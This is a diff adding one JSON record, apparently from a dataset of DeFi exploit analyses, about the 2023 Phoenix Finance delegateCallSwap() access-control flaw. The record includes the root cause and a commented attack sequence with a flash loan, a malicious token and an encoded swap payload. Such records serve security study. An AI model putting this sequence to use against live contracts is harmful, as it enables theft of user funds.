@@ -1,0 +1,27 @@
+{
+ "id": "2023__2023-03-01_Phoenix_DelegateCallSwapAccessControl",
+ "source_file": "2023/2023-03-01_Phoenix_DelegateCallSwapAccessControl.md",
+ "title": "Phoenix Finance Exploit — delegateCallSwap() Missing Access Control",
+ "date": "2023-03-01",
+ "protocol": "Phoenix",
+ "chain": null,
+ "loss_raw": null,
+ "loss_usd": null,
+ "root_cause": null,
+ "attack_tx": null,
+ "vulnerable_contract": null,
+ "classes": [
+  "access-control"
+ ],
+ "code_before": [],
+ "code_after": [],
+ "steps": [
+  "// → PhxProxy holds WETH internally",
+  "// → PhxProxy swaps its WETH → SHITCOIN (attacker's token)",
+  "// 6. Router.swapExactTokensForTokens(SHITCOIN → WETH → USDC)"
+ ],
+ "other_code": [
+  "// Root Cause: `delegateCallSwap()` lacked an `onlyOwner` or `onlyAuthorized` modifier and accepted fully arbitrary calldata with no router allowlist.\n// Source code unverified — based on bytecode analysis",
+  "// 1. DODO flash loan: 8000 USDC\n// 2. Create malicious SHITCOIN token and add SHITCOIN/WETH liquidity\n// 3. phxProxy.buyLeverage(8000e6, 0, deadline, bytes(\"\"))\n//    → PhxProxy holds WETH internally\n// 4. Build delegateCallSwap payload:\nbytes memory swapData = abi.encodeWithSelector(\n    0xa9678a18,\n    address(Router),    // QuickSwap router\n    address(WETH),      // tokenIn\n    address(MYTOKEN),   // tokenOut (attacker's token)\n    swapAmount);\n// 5. phxProxy.delegateCallSwap(swapData)\n//    → PhxProxy swaps its WETH → SHITCOIN (attacker's token)\n// 6. Router.swapExactTokensForTokens(SHITCOIN → WETH → USDC)\n// 7. Repay DODO flash loan"
+ ]
+}
